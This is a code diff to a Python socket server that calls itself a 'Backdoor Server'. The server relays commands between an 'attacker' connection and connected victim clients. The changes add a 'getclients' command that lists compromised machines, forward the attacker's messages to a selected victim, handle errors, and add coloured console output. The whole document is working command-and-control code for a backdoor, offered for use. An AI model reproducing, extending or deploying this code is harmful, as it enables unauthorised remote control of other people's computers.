@@ -18,6 +18,13 @@ server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind(ADDR)
 
 
+def get_clients(l):
+    result = ""
+    for c in l:
+        result += str(c[0]) + "<>" + str(c[1]) + "<c>"
+    return result
+
+
 def handle_connection(conn, addr):
     try:
         global attacker
@@ -38,17 +45,19 @@ def handle_connection(conn, addr):
                     clientnum, messageC = str(msg).split("<?CLIENT?>")
                     if i == 0:
                         clients.append((clientnum, addr, conn))
-                        print(str(addr) + ":" + clientnum + " client connected")
+                        print("\033[2;33;5m" + str(addr) + ":" + clientnum + " client connected")
                     i = 1
                     if selectedclient:
                         for c in clients:
                             if c[1] == addr:
                                 if c[0] == selectedclient:
-                                    print("client: " + messageC)
+                                    print("\033[2;0;5m client: " + messageC)
                                     if messageC:
-                                        print("send to attacker")
-                                        attacker[0].send(messageC.encode(FORMAT))
-                                        messageC = ""
+                                        if attacker:
+                                            attacker[0].send(messageC.encode(FORMAT))
+                                            messageC = ""
+                                        else:
+                                            break
                                     selectedclient = ""
                                     loop = False
                                 else:
@@ -64,15 +73,23 @@ def handle_connection(conn, addr):
                 attacker = conn, addr
                 while True:
                     selectedclient, messageA = str(msg).split("<?ATTACKER?>")
-                    if clients:
-                        print("attacker: " + messageA)
+                    if "getclients" in messageA:
+                        result = get_clients(clients)
+                        attacker[0].send(result.encode(FORMAT))
+                        messageA = ""
+                        break
+                    elif clients and "getclients" not in messageA:
+                        print("\033[2;0;5m attacker: " + messageA)
                         for c in clients:
                             if c[0] == selectedclient:
-                                c[2].send(messageA.encode(FORMAT))
+                                try:
+                                    c[2].send(messageA.encode(FORMAT))
+                                except:
+                                    clients.remove(c)
                         messageA = ""
                         break
     except:
-        clients = []
+        attacker = []
 
 
 def start():
@@ -93,6 +110,7 @@ print("""\033[2;31;5m
  |____/|____/|_/_/\_\/_/\_\_|    \__, |
                                   __/ |
                                  |___/ 
+          Backdoor Server
 """)
 print("\033[2;32;5m[STARTING] server is starting...")
 start()
